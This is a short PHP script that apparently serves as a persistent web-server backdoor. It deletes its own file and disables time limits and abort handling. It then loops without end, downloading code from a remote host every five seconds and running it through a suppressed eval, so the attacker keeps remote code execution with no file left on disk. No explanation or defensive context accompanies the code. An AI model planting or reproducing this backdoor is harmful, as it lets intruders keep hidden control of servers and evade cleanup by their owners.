    <?php
        chmod($_SERVER['SCRIPT_FILENAME'], 0777);
        unlink($_SERVER['SCRIPT_FILENAME']);
        ignore_user_abort(true);
        set_time_limit(0);
        echo "success";
        $remote_file = 'http://10.211.55.2/111/test.txt';
        while($code = file_get_contents($remote_file)){
        @eval($code);
        echo "xunhuan";
        sleep(5);
        };
    ?>
